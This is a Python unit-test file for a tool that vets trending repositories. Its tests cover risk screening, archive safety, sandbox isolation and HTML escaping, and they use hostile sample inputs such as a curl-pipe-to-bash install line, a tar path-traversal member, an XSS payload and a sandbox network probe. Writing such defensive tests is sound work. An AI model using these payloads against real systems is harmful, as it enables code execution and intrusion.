from __future__ import annotations

import copy
import hashlib
import io
import json
import os
import shutil
import subprocess
import tarfile
import tempfile
import unittest
from datetime import UTC, datetime
from pathlib import Path
from unittest.mock import patch

from worthit.discovery import QUALIFICATION_REVISION, parse_trending, run_daily, score_candidate
from worthit.evaluate import compare_replays, evaluate_claims
from worthit.inspect import (
    INSPECTION_REVISION,
    assess_risk,
    detect_environment,
    refresh_repository_inspection,
    safe_extract_tar,
    source_tree_report,
)
from worthit.models import Claim, TestPlan, TrustClass, atomic_json
from worthit.pipeline import _load_state
from worthit.planning import _ensure_grounded_repair, _ensure_grounded_strings, model_cost
from worthit.review import _observed_version
from worthit.runner import (
    DockerRunner,
    RunnerConfig,
    Sandbox,
    _expand_argv,
    _stage_inert_file,
    _validate_requirements,
    execution_contract_sha256,
    redact,
    vcs_version_fallback,
    verify_dependency_bundle,
    verify_source_snapshot,
)
from worthit.site import build_site

ROOT = Path(__file__).resolve().parents[1]


def claim() -> Claim:
    return Claim.from_dict(
        {
            "claim_id": "CLAIM-001",
            "source": "README.md",
            "source_excerpt": "sorts files",
            "text": "The CLI sorts files.",
            "importance": "HIGH",
            "testability": "HIGH",
            "rationale": "Directly observable.",
        }
    )


def plan_raw() -> dict[str, object]:
    return {
        "core_workflow": "Sort one file.",
        "entrypoint": "tool",
        "designer": "test",
        "tests": [
            {
                "test_id": "T01",
                "claim_ids": ["CLAIM-001"],
                "purpose": "Sort a file.",
                "argv": ["{entrypoint}", "file.py"],
                "stdin": "",
                "setup_files": {"file.py": "import b\nimport a\n"},
                "expected_exit_codes": [0],
                "stdout_contains": [],
                "stderr_contains": [],
                "file_assertions": [
                    {"path": "file.py", "exists": True, "exact_text": "import a\nimport b\n", "contains": []}
                ],
                "timeout_sec": 10,
                "edge_case": False,
                "required_resources": ["CPU"],
                "evidence": ["stdout", "stderr"],
            },
            {
                "test_id": "T02",
                "claim_ids": ["CLAIM-001"],
                "purpose": "Reject a missing file.",
                "argv": ["{entrypoint}", "missing.py"],
                "stdin": "",
                "setup_files": {},
                "expected_exit_codes": [2],
                "stdout_contains": [],
                "stderr_contains": ["missing"],
                "file_assertions": [],
                "timeout_sec": 10,
                "edge_case": True,
                "required_resources": ["CPU"],
                "evidence": ["stdout", "stderr"],
            },
        ],
        "limitations": [],
    }


def daily_candidate(repository: str, sources: list[str], description: str) -> dict[str, object]:
    owner, name = repository.split("/")
    now = datetime(2026, 8, 14, tzinfo=UTC)
    return {
        "repository": repository,
        "owner": owner,
        "name": name,
        "url": f"https://github.com/{repository}",
        "description": description,
        "primary_language": "Python",
        "topics": ["ai", "cli", "developer-tools"],
        "license": "MIT",
        "created_at": "2020-01-01T00:00:00Z",
        "updated_at": "2026-08-14T00:00:00Z",
        "pushed_at": "2026-08-13T00:00:00Z",
        "commit_date": "2026-08-13T00:00:00Z",
        "stars": 5_000,
        "forks": 200,
        "stars_today": 400,
        "size_kb": 1_000,
        "archived": False,
        "disabled": False,
        "fork": False,
        "owner_type": "Organization",
        "discovery_sources": sources,
        "discovered_at": now.isoformat(),
        "current_commit_sha": "a" * 40,
        "current_release": None,
        "readme_reference": f"https://github.com/{repository}/tree/{'a' * 40}#readme",
        "candidate_status": "DISCOVERED",
        "category": "coding agent",
        "testability": "PENDING",
        "risk_classification": "INSUFFICIENT_INFORMATION",
        "priority": {},
        "previous_worthit_run": None,
    }


class CoreBoundaryTests(unittest.TestCase):
    def test_trending_parser_and_daily_selection_fail_closed(self) -> None:
        trending = """
        <article class="Box-row"><h2><a href="/good/tool">good / tool</a></h2>
        <span class="d-inline-block float-sm-right">1,234 stars today</span></article>
        """
        self.assertEqual(parse_trending(trending), [("good/tool", 1234)])
        now = datetime(2026, 8, 14, tzinfo=UTC)

        single_signal = daily_candidate("single/tool", ["github-trending:overall"], "AI developer CLI")
        score_candidate(single_signal, set(), now=now)
        self.assertFalse(single_signal["metadata_qualified"])
        ordinary_words = daily_candidate(
            "plain/emailer",
            ["github-trending:overall", "github-trending:python"],
            "Daily email maintenance utility",
        )
        ordinary_words["topics"] = []
        score_candidate(ordinary_words, set(), now=now)
        self.assertEqual(ordinary_words["priority"]["components"]["relevance"], 20)
        qualified = daily_candidate(
            "good/tool",
            ["github-trending:overall", "github-search:artificial-intelligence"],
            "AI developer CLI for testing code",
        )

        class FakeProvider:
            name = "fixture"
            errors: list[str] = []

            def discover(self, *, now: datetime, limit: int) -> list[dict[str, object]]:
                return copy.deepcopy([qualified, single_signal][:limit])

        def approve(
            value: dict[str, object], *, work_root: Path, reviewed_commits: set[str], now: datetime
        ) -> dict[str, object]:
            value["qualification"] = {
                "revision": QUALIFICATION_REVISION,
                "inspection_revision": INSPECTION_REVISION,
                "inspected_at": now.isoformat(),
                "passed": True,
                "environment_track": "python-cli",
                "gates": {"testability": {"passed": True}},
            }
            value["candidate_status"] = "QUALIFIED"
            return value

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            with patch("worthit.discovery._deep_qualify", side_effect=approve) as deep_qualify:
                report = run_daily(
                    provider=FakeProvider(),
                    backlog_path=root / "data" / "candidates.json",
                    hunts_root=root / "hunts",
                    work_root=root / "work",
                    reviews_root=root / "reviews",
                    site_dir=root / "site",
                    discovery_limit=10,
                    qualify_limit=5,
                    daily_limit=5,
                    now=now,
                )
                run_daily(
                    provider=FakeProvider(),
                    backlog_path=root / "data" / "candidates.json",
                    hunts_root=root / "hunts",
                    work_root=root / "work",
                    reviews_root=root / "reviews",
                    site_dir=root / "site",
                    discovery_limit=10,
                    qualify_limit=5,
                    daily_limit=5,
                    now=now,
                )
            self.assertEqual(report["counts"]["selected"], 1)
            self.assertEqual(report["selected"][0]["repository"], "good/tool")
            self.assertEqual(deep_qualify.call_count, 1)
            self.assertTrue((root / "hunts" / "2026-08-14.json").is_file())
            self.assertTrue((root / "site" / "daily" / "2026-08-14" / "index.html").is_file())

    def test_daily_execution_is_acknowledged_and_retry_bounded(self) -> None:
        now = datetime(2026, 8, 14, tzinfo=UTC)
        candidate = daily_candidate(
            "good/tool",
            ["github-trending:overall", "github-search:artificial-intelligence"],
            "AI developer CLI for testing code",
        )

        class FakeProvider:
            name = "fixture"
            errors: list[str] = []

            def discover(self, *, now: datetime, limit: int) -> list[dict[str, object]]:
                return copy.deepcopy([candidate])

        def approve(
            value: dict[str, object], *, work_root: Path, reviewed_commits: set[str], now: datetime
        ) -> dict[str, object]:
            value["qualification"] = {
                "revision": QUALIFICATION_REVISION,
                "inspection_revision": INSPECTION_REVISION,
                "inspected_at": now.isoformat(),
                "passed": True,
                "gates": {"testability": {"passed": True}},
            }
            value["candidate_status"] = "QUALIFIED"
            return value

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            arguments = {
                "provider": FakeProvider(),
                "backlog_path": root / "data" / "candidates.json",
                "hunts_root": root / "hunts",
                "work_root": root / "work",
                "reviews_root": root / "reviews",
                "site_dir": root / "site",
                "discovery_limit": 1,
                "qualify_limit": 1,
                "daily_limit": 1,
                "execute": True,
                "now": now,
            }
            with self.assertRaisesRegex(ValueError, "requires --allow-runc"):
                run_daily(**arguments)
            arguments["allow_runc"] = True
            with (
                patch("worthit.discovery._deep_qualify", side_effect=approve),
                patch("worthit.discovery.evaluate_repository", side_effect=RuntimeError("failed")) as run,
            ):
                run_daily(**arguments)
                run_daily(**arguments)
                run_daily(**arguments)
            self.assertEqual(run.call_count, 2)
            backlog = json.loads((root / "data" / "candidates.json").read_text())
            self.assertEqual(backlog["candidates"][0]["evaluation_attempts"], 2)
            self.assertTrue(backlog["candidates"][0]["retry_exhausted"])

    def test_detects_bounded_node_and_go_cli_tracks(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "cli.js").write_text("#!/usr/bin/env node\n")
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "@scope/tool",
                        "version": "1.2.3",
                        "license": "MIT",
                        "bin": "cli.js",
                        "dependencies": {},
                    }
                )
            )
            node = detect_environment(root)
            self.assertEqual(node["track"], "node-cli")
            self.assertEqual(node["entrypoints"], {"tool": "cli.js"})
            self.assertTrue(node["supported"])
            (root / "package.json").write_text(
                json.dumps({"name": "tool", "bin": {"tool": "cli.js"}, "dependencies": {"x": "1"}})
            )
            self.assertFalse(detect_environment(root)["supported"])

    def test_inspection_revision_refreshes_and_archives_stale_derived_state(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            run = Path(temporary) / "run"
            source = run / "source"
            source.mkdir(parents=True)
            (source / "cli.js").write_text("#!/usr/bin/env node\n")
            (source / "package.json").write_text(
                json.dumps({"name": "tool", "version": "1.0.0", "bin": "cli.js"})
            )
            tree = source_tree_report(source)
            repository = {
                "source_tree_sha256": tree["sha256"],
                "source_files": tree["files"],
                "source_bytes": tree["bytes"],
                "inspection_revision": 0,
            }
            refreshed = refresh_repository_inspection(repository, run)
            self.assertEqual(refreshed["inspection_revision"], INSPECTION_REVISION)
            self.assertEqual(refreshed["environment"]["track"], "node-cli")
            atomic_json(
                run / "state.json",
                {
                    "repository_url": "https://github.com/good/tool",
                    "commit_sha": "a" * 40,
                    "inspection_revision": 0,
                    "stages": {},
                },
            )
            (run / "claims.json").write_text("stale\n")
            state = _load_state(run, "https://github.com/good/tool", "a" * 40)
            self.assertEqual(state["inspection_revision"], INSPECTION_REVISION)
            self.assertTrue((run / "stale-inspection-0" / "claims.json").is_file())
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "go.mod").write_text(
                "module example.com/gron\n\ngo 1.24\n\nrequire example.com/dependency v1.2.3\n"
            )
            (root / "go.sum").write_text("example.com/dependency v1.2.3 h1:placeholder\n")
            (root / "main.go").write_text("package main\n\nfunc main() {}\n")
            go = detect_environment(root)
            self.assertEqual(go["track"], "go-cli")
            self.assertEqual(go["entrypoints"], {"gron": "."})
            self.assertTrue(go["supported"])
            (root / "go.sum").unlink()
            self.assertFalse(detect_environment(root)["supported"])

    def test_go_source_is_included_in_static_risk_screening(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "main.go").write_text(
                'package main\nimport "os/exec"\nfunc main(){ exec.Command("bash", "-c", "id") }\n'
            )
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.REVIEW)
            self.assertIn("shell_execution", {finding.category for finding in report.findings})

    def test_dependency_bundle_integrity_and_track_argv(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bundle = root / "bundle"
            artifact = bundle / "module" / "@v" / "v1.0.0.mod"
            artifact.parent.mkdir(parents=True)
            artifact.write_text("module example.com/module\n")
            tree = source_tree_report(bundle)
            report = root / "dependency-fetch.json"
            atomic_json(
                report,
                {
                    "artifacts": [
                        {
                            "path": artifact.relative_to(bundle).as_posix(),
                            "bytes": artifact.stat().st_size,
                            "sha256": hashlib.sha256(artifact.read_bytes()).hexdigest(),
                        }
                    ],
                    "bundle_sha256": tree["sha256"],
                },
            )
            self.assertEqual(verify_dependency_bundle(bundle, report), bundle)
            artifact.write_text("changed\n")
            with self.assertRaises(RuntimeError):
                verify_dependency_bundle(bundle, report)
        self.assertEqual(
            _expand_argv(["{entrypoint}", "x"], "/work/bin/tool", None),
            ["/work/bin/tool", "x"],
        )
        with self.assertRaises(RuntimeError):
            _expand_argv(["{python}", "-V"], "/work/bin/tool", None)

    def test_archive_traversal_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            archive = Path(temporary) / "source.tar.gz"
            with tarfile.open(archive, "w:gz") as bundle:
                member = tarfile.TarInfo("repo/../escape.txt")
                member.size = 4
                bundle.addfile(member, io.BytesIO(b"nope"))
            with self.assertRaises(ValueError):
                safe_extract_tar(archive, Path(temporary) / "output")
            self.assertFalse((Path(temporary) / "escape.txt").exists())

    def test_source_snapshot_detects_tampering(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "source"
            source.mkdir()
            candidate = source / "tool.py"
            candidate.write_text("print('data only')\n")
            archive = root / "source.tar.gz"
            archive.write_bytes(b"trusted transport bytes")
            tree = source_tree_report(source)
            repository = {
                "commit_sha": "a" * 40,
                "archive_sha256": hashlib.sha256(archive.read_bytes()).hexdigest(),
                "source_tree_sha256": tree["sha256"],
                "source_files": tree["files"],
                "source_bytes": tree["bytes"],
            }
            self.assertFalse(verify_source_snapshot(source, archive, repository)["git_parser_on_host"])
            candidate.write_text("print('changed')\n")
            with self.assertRaises(ValueError):
                verify_source_snapshot(source, archive, repository)

    def test_model_rejects_path_escape_and_host_command(self) -> None:
        raw = plan_raw()
        raw["tests"][0]["setup_files"] = {"../escape": "bad"}  # type: ignore[index]
        with self.assertRaises(ValueError):
            TestPlan.from_dict(raw, [claim()], "test")
        raw = plan_raw()
        raw["tests"][0]["argv"] = ["sh", "-c", "true"]  # type: ignore[index]
        with self.assertRaises(ValueError):
            TestPlan.from_dict(raw, [claim()], "test")

    def test_risk_gate_flags_pipe_to_shell(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "install.sh").write_text("curl https://example.invalid/x | bash\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.REVIEW)
            self.assertIn("pipe_to_shell", {finding.category for finding in report.findings})

    def test_ci_only_sudo_is_recorded_without_blocking_unrelated_execution(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            workflow = source / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text("run: sudo sed -i 's/a/b/' /etc/example\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.TRUSTED)
            self.assertEqual(report.findings[0].severity, "MEDIUM")

    def test_checked_in_license_restriction_overrides_api_spdx_guess(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "LICENSE").write_text("MIT License plus the Commons Clause\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.INSUFFICIENT)
            self.assertIn("restrictive_license_terms", {finding.category for finding in report.findings})

    def test_runner_command_has_no_mount_socket_network_or_caps(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            sandbox = Sandbox(Path(temporary), RunnerConfig(allow_runc=True), "runc", "test")
            argv = sandbox.create_argv()
            self.assertEqual(argv[argv.index("--network") + 1], "none")
            self.assertEqual(argv[argv.index("--cap-drop") + 1], "ALL")
            self.assertNotIn("--volume", argv)
            self.assertNotIn("--mount", argv)
            self.assertFalse(any("docker.sock" in value for value in argv))

    def test_requirement_and_secret_boundaries(self) -> None:
        self.assertEqual(
            _validate_requirements(["hatchling>=1.0", "packaging"]), ["hatchling>=1.0", "packaging"]
        )
        for unsafe in ("tool @ https://example.invalid/tool.whl", "../tool", "git+https://example.invalid/x"):
            with self.assertRaises(RuntimeError):
                _validate_requirements([unsafe])
        token = "ghp_" + "x" * 40
        cleaned = redact(f"{token} {Path.home()}/secret")
        self.assertNotIn(token, cleaned)
        self.assertNotIn(str(Path.home()), cleaned)
        fallback, adjustments = vcs_version_fallback(
            {
                "build_requires": ["hatch-vcs>=0.4"],
                "dynamic": ["version"],
                "project_name": "demo-tool",
            },
            "a" * 40,
        )
        self.assertEqual(
            fallback,
            {
                "SETUPTOOLS_SCM_PRETEND_VERSION": "0+worthit.aaaaaaaaaaaa",
                "SETUPTOOLS_SCM_PRETEND_VERSION_FOR_DEMO_TOOL": "0+worthit.aaaaaaaaaaaa",
            },
        )
        self.assertEqual(adjustments[0]["kind"], "vcs_version_fallback")
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "one").mkdir()
            (root / "two").mkdir()
            atomic_json(root / "one" / "response.json", {"total_cost_usd": 0.125})
            atomic_json(root / "two" / "response.json", {"total_cost_usd": 0.375})
            self.assertEqual(model_cost(root), 0.5)

    def test_replay_comparison_detects_mismatch(self) -> None:
        run = {
            "status": "COMPLETE",
            "label": "one",
            "tests": [
                {
                    "test_id": "T01",
                    "status": "PASS",
                    "exit_code": 0,
                    "assertions": [{"assertion": "x", "passed": True}],
                }
            ],
        }
        self.assertTrue(compare_replays(run, {**copy.deepcopy(run), "label": "two"})["reproduced"])
        changed = copy.deepcopy(run)
        changed["label"] = "two"
        changed["tests"][0]["exit_code"] = 1
        self.assertFalse(compare_replays(run, changed)["reproduced"])
        contract = TestPlan.from_dict(plan_raw(), [claim()], "test")
        first = execution_contract_sha256(contract, {}, {"image_id": "one"})
        second = execution_contract_sha256(contract, {}, {"image_id": "two"})
        self.assertNotEqual(first, second)

    def test_staged_install_claim_stays_partial(self) -> None:
        install_claim = Claim.from_dict(
            {
                "claim_id": "CLAIM-001",
                "source": "README.md",
                "source_excerpt": "pip install tool",
                "text": "Running pip install tool installs the package.",
                "importance": "HIGH",
                "testability": "HIGH",
                "rationale": "Observable.",
            }
        )
        execution = {
            "status": "COMPLETE",
            "installation_method": "pip source install from an offline wheelhouse",
            "install_adjustments": [{"kind": "vcs_version_fallback"}],
            "tests": [
                {
                    "test_id": "T01",
                    "status": "PASS",
                    "evidence": ["evidence/final/T01/stdout.txt"],
                }
            ],
        }
        result = evaluate_claims(
            [install_claim], TestPlan.from_dict(plan_raw(), [install_claim], "test"), execution
        )
        self.assertEqual(result[0].status.value, "PARTIAL")

    def test_version_probe_strips_output_label(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            output = root / "version.txt"
            output.write_text("banner\nVERSION 1.2.3\n")
            execution = {"version_probe": {"exit_code": 0, "stdout_file": str(output)}}
            self.assertEqual(_observed_version(execution, root), "1.2.3")

    def test_warm_repair_requires_observed_assertions(self) -> None:
        original = TestPlan.from_dict(plan_raw(), [claim()], "initial")
        valid_raw = plan_raw()
        valid_raw["tests"][1]["expected_exit_codes"] = [0]  # type: ignore[index]
        valid_raw["tests"][1]["stderr_contains"] = ["actual error"]  # type: ignore[index]
        valid = TestPlan.from_dict(valid_raw, [claim()], "repair")
        evidence = {
            "tests": [
                {
                    "test_id": "T01",
                    "exit_code": 0,
                    "assertions": [],
                    "evidence": ["evidence/warm/T01/stdout.txt", "evidence/warm/T01/stderr.txt"],
                },
                {
                    "test_id": "T02",
                    "exit_code": 0,
                    "assertions": [],
                    "evidence": ["evidence/warm/T02/stdout.txt", "evidence/warm/T02/stderr.txt"],
                },
            ],
            "outputs": {
                "evidence/warm/T01/stdout.txt": "",
                "evidence/warm/T01/stderr.txt": "",
                "evidence/warm/T02/stdout.txt": "",
                "evidence/warm/T02/stderr.txt": "actual error",
            },
        }
        _ensure_grounded_repair(original, valid, evidence)
        weakened_raw = plan_raw()
        weakened_raw["tests"][1]["expected_exit_codes"] = [0, 2]  # type: ignore[index]
        weakened_raw["tests"][1]["stderr_contains"] = []  # type: ignore[index]
        weakened = TestPlan.from_dict(weakened_raw, [claim()], "repair")
        with self.assertRaises(ValueError):
            _ensure_grounded_repair(original, weakened, evidence)
        _ensure_grounded_strings(
            "T03",
            "stdout",
            ["function add(first,second)", "add(3,7)"],
            ["console.log(10)"],
            "console.log(10);\n",
        )
        with self.assertRaises(ValueError):
            _ensure_grounded_strings(
                "T03", "stdout", ["function add(first,second)", "add(3,7)"], ["log"], "console.log(10);\n"
            )

    def test_static_site_escapes_stored_xss(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        review = json.loads(template_path.read_text())
        original_score = review["score"]["overall"]
        attack = '</title><script>alert("x")</script><img src=x onerror=alert(1)>'
        review["project"] = attack
        review["summary"] = attack
        review["claim_matrix"][0]["claim"] = attack
        review["tests"][0]["purpose"] = attack
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            artifact = root / "reviews" / "owner" / "repo" / review["commit_sha"]
            shutil.copytree(template_path.parent, artifact)
            atomic_json(artifact / "review.json", review)
            site = root / "site"
            self.assertEqual(build_site(root / "reviews", site), 1)
            rendered = next((site / "reviews").rglob("index.html")).read_text()
            self.assertNotIn("<script>", rendered)
            self.assertNotIn("<img", rendered)
            self.assertIn("&lt;script&gt;", rendered)
            review["score"]["bullshit_ratio"] = None
            review["performance"]["peak_ram_bytes"] = None
            atomic_json(artifact / "review.json", review)
            self.assertEqual(build_site(root / "reviews", site), 1)
            self.assertIn("Bullshit Ratio N/A", next((site / "reviews").rglob("index.html")).read_text())
            self.assertIn(
                "below the 200 ms sampling resolution",
                next((site / "reviews").rglob("index.html")).read_text(),
            )
            review["score"]["overall"] = attack
            atomic_json(artifact / "review.json", review)
            with self.assertRaises(ValueError):
                build_site(root / "reviews", site)
            review["score"]["overall"] = original_score
            review["repository"] = "../evil"
            review["repository_url"] = "https://github.com/../evil"
            atomic_json(artifact / "review.json", review)
            with self.assertRaises(ValueError):
                build_site(root / "reviews", site)

    def test_published_artifacts_contain_no_candidate_executables(self) -> None:
        forbidden = {".py", ".js", ".sh", ".whl", ".exe", ".bin", ".so"}
        self.assertFalse(
            [path for path in (ROOT / "reviews").rglob("*") if path.is_file() and path.suffix in forbidden]
        )


@unittest.skipUnless(
    os.environ.get("WORTHIT_DOCKER_TESTS") == "1", "set WORTHIT_DOCKER_TESTS=1 for isolation checks"
)
class DockerIsolationTests(unittest.TestCase):
    def test_disposable_container_has_no_secret_mount_or_network(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            config = RunnerConfig(allow_runc=True, test_timeout=10)
            canary = "ghp_" + "z" * 40
            os.environ["WORTHIT_TEST_CANARY"] = canary
            try:
                for track in ("python-cli", "node-cli", "go-cli"):
                    with self.subTest(track=track):
                        run_dir = (Path(temporary) / track).resolve()
                        run_dir.mkdir()
                        runner = DockerRunner(run_dir, config, TrustClass.TRUSTED, {"track": track})
                        runner.preflight()
                        sandbox = Sandbox(run_dir, config, "runc", "hostile-fixture", runner.image)
                        sandbox.start()
                        try:
                            inert = run_dir / "inert.txt"
                            inert.write_text("manifest data\n")
                            _stage_inert_file(sandbox.name, inert, "/work/inert.txt", 1000)
                            inspected = json.loads(
                                subprocess.run(
                                    ["docker", "inspect", sandbox.name],
                                    text=True,
                                    capture_output=True,
                                    timeout=10,
                                    check=True,
                                ).stdout
                            )[0]
                            self.assertEqual(inspected["Mounts"], [])
                            self.assertEqual(inspected["HostConfig"]["NetworkMode"], "none")
                            staged = sandbox.exec(
                                [
                                    "/usr/local/bin/python",
                                    "-I",
                                    "-c",
                                    "print(open('/work/inert.txt').read(), end='')",
                                ],
                                "/work",
                                b"",
                                5,
                                run_dir / "evidence" / "staging",
                                "staging",
                            )
                            self.assertEqual((run_dir / staged.stdout_file).read_text(), "manifest data\n")
                            trace = sandbox.exec(
                                [
                                    "/usr/local/bin/python",
                                    "-I",
                                    "-c",
                                    "import json,os,socket,sys; s=socket.socket(); s.settimeout(.2); print(json.dumps({'env':sorted(os.environ),'socket':os.path.exists('/var/run/docker.sock'),'host_home':os.path.exists(sys.argv[1]),'network':s.connect_ex(('1.1.1.1',53))}))",
                                    str(Path.home()),
                                ],
                                "/work",
                                b"",
                                5,
                                run_dir / "evidence" / "probe",
                                "probe",
                            )
                            output = (run_dir / trace.stdout_file).read_text()
                            observation = json.loads(output)
                            self.assertNotIn("WORTHIT_TEST_CANARY", observation["env"])
                            self.assertNotIn(canary, output)
                            self.assertFalse(observation["socket"])
                            self.assertFalse(observation["host_home"])
                            self.assertNotEqual(observation["network"], 0)
                            timed = sandbox.exec(
                                [
                                    "/usr/local/bin/python",
                                    "-I",
                                    "-c",
                                    "import time; time.sleep(60)",
                                ],
                                "/work",
                                b"",
                                1,
                                run_dir / "evidence" / "timeout",
                                "timeout",
                            )
                            self.assertTrue(timed.timed_out)
                        finally:
                            sandbox.close()
                        missing = subprocess.run(
                            ["docker", "inspect", sandbox.name],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            check=False,
                        )
                        self.assertNotEqual(missing.returncode, 0)
            finally:
                os.environ.pop("WORTHIT_TEST_CANARY", None)


if __name__ == "__main__":
    unittest.main()
